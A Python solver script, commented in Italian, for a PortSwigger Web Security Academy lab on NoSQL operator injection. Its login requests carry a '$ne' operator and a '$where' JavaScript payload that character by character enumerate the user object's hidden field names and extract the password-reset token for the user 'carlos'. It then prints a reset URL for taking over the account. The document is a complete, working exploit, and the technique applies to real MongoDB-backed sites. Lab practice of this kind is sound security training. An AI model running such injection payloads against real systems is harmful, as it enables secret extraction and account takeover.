"""
    RISOLUZIONE DEL LAB: Exploiting NoSQL operator injection to extract unknown fields
    URL: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
"""
import requests
import sys
import string
import urllib3
from lxml import html  # Necessario per il parsing del CSRF token

# Disabilita warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except Exception:
    class Fore:
        RED = ''
        GREEN = ''
        YELLOW = ''
        BLUE = ''
        CYAN = ''
        MAGENTA = ''
    class Style:
        RESET_ALL = ''

def colored(text, color):
    return f"{color}{text}{Style.RESET_ALL}"

def print_error(msg):
    print(colored(f"[-] {msg}", Fore.RED))

def print_success(msg):
    print(colored(f"[+] {msg}", Fore.GREEN))

def print_info(msg):
    print(colored(f"[*] {msg}", Fore.CYAN))

def print_status(msg):
    sys.stdout.write(f"\r{colored(f'[~] {msg}', Fore.YELLOW)}")
    sys.stdout.flush()

# --- CONFIGURAZIONE ---
# INSERISCI QUI IL TUO ID DEL LAB
LAB_ID = "YOUR_LAB_ID_HERE"  

class NoSQLInjectionExploit:
    def __init__(self, lab_id):
        self.lab_id = lab_id
        self.base_url = f"https://{lab_id}.web-security-academy.net"
        self.login_url = f"{self.base_url}/login"
        self.forgot_url = f"{self.base_url}/forgot-password"
        
        self.session = requests.Session()
        # Header user agent generico
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (NoSQLi-Solver)"})
        self.session.verify = False # Ignora SSL errors
        
        # Caratteri da testare
        self.charset = string.ascii_letters + string.digits + "-_"
        
    def check_lab_status(self):
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code == 200:
                print_success(f"Lab raggiungibile: {self.base_url}")
                return True
            else:
                print_error(f"Lab non raggiungibile (Status: {response.status_code})")
                return False
        except Exception as e:
            print_error(f"Errore connessione: {e}")
            return False

    def trigger_reset(self):
        """
        Esegue la procedura di Forgot Password per 'carlos'
        in modo che il DB generi il campo del token.
        """
        print_info("Innesco procedura 'Forgot Password' per generare il token nel DB...")
        
        # 1. GET per ottenere il CSRF
        try:
            r_get = self.session.get(self.forgot_url)
            tree = html.fromstring(r_get.text)
            csrf_token = tree.xpath('//input[@name="csrf"]/@value')[0]
        except Exception as e:
            print_error(f"Impossibile recuperare il token CSRF dalla pagina forgot-password: {e}")
            return False
            
        # 2. POST per richiedere il reset
        data = {
            "csrf": csrf_token,
            "username": "carlos"
        }
        
        # Nota: Qui NON usiamo headers JSON, è una form standard
        r_post = self.session.post(self.forgot_url, data=data)
        
        if r_post.status_code == 200:
            print_success("Richiesta reset inviata! Il campo Token è stato creato.")
            return True
        else:
            print_error(f"Errore nella richiesta reset (Status: {r_post.status_code})")
            return False

    def send_injection(self, where_payload):
        """
        Invia il payload JSON alla login.
        """
        # Header specifici per JSON injection
        json_headers = {"Content-Type": "application/json"}
        
        data = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": where_payload
        }
        
        try:
            response = self.session.post(self.login_url, json=data, headers=json_headers)
            
            if "Account locked" in response.text:
                return True
            elif "Invalid username" in response.text:
                return False
            else:
                return False
        except Exception as e:
            print_error(f"Errore nella request: {e}")
            return False

    def extract_field_name(self, key_index):
        extracted_name = ""
        print_info(f"Estrazione nome campo all'indice [{key_index}]...")
        
        while True:
            char_found = False
            current_offset = len(extracted_name)
            
            for char in self.charset:
                print_status(f"Testando char: {extracted_name}{char}...")
                
                # Payload per nome campo
                payload = f"Object.keys(this)[{key_index}].match('^.{{{current_offset}}}{char}.*')"
                
                if self.send_injection(payload):
                    extracted_name += char
                    char_found = True
                    break
            
            if not char_found:
                sys.stdout.write("\n")
                break
                
        return extracted_name

    def extract_field_value(self, field_name):
        extracted_value = ""
        print_info(f"Estrazione VALORE del campo '{field_name}'...")
        
        while True:
            char_found = False
            current_offset = len(extracted_value)
            
            for char in self.charset:
                print_status(f"Testando char: {extracted_value}{char}...")
                
                # Payload per valore campo
                payload = f"this.{field_name}.match('^.{{{current_offset}}}{char}.*')"
                
                if self.send_injection(payload):
                    extracted_value += char
                    char_found = True
                    break
            
            if not char_found:
                sys.stdout.write("\n")
                break
                
        return extracted_value

    def run(self):
        if not self.check_lab_status():
            return
        
        # 1. GENERIAMO IL TOKEN PRIMA DI TUTTO
        if not self.trigger_reset():
            return
        
        # 2. Procediamo con l'enumerazione
        print_info("Inizio enumerazione dei campi dell'oggetto User...")
        
        target_field_name = None
        
        # Scansioniamo indici. Ora ci aspettiamo che il token appaia.
        for i in range(6):
            field_name = self.extract_field_name(i)
            
            if not field_name:
                print_info(f"Nessun campo trovato all'indice {i}. Fine enumerazione.")
                break
                
            print_success(f"Campo trovato all'indice {i}: {field_name}")
            
            # Logica per identificare il token
            if "token" in field_name.lower() or "reset" in field_name.lower():
                target_field_name = field_name
                print_success(f" -> Trovato possibile token di reset: {target_field_name}")
                break
        
        if target_field_name:
            token_value = self.extract_field_value(target_field_name)
            print_success(f"VALORE TOKEN ESTRATTO: {token_value}")
            
            reset_url = f"{self.base_url}/forgot-password?{target_field_name}={token_value}"
            print("\n" + "="*50)
            print_success("ATTACCO COMPLETATO CON SUCCESSO!")
            print(f"URL per il reset della password:")
            print(f"{reset_url}")
            print("\nCopia questo URL nel browser, resetta la password e loggati come Carlos!")
            print("="*50)
        else:
            print_error("Non è stato possibile identificare il campo del token.")

def main():
    if LAB_ID == "YOUR_LAB_ID_HERE":
        print_error("\nERRORE: Devi impostare il LAB_ID nello script!")
        sys.exit(1)
    
    exploit = NoSQLInjectionExploit(LAB_ID)
    exploit.run()

if __name__ == "__main__":
    main()
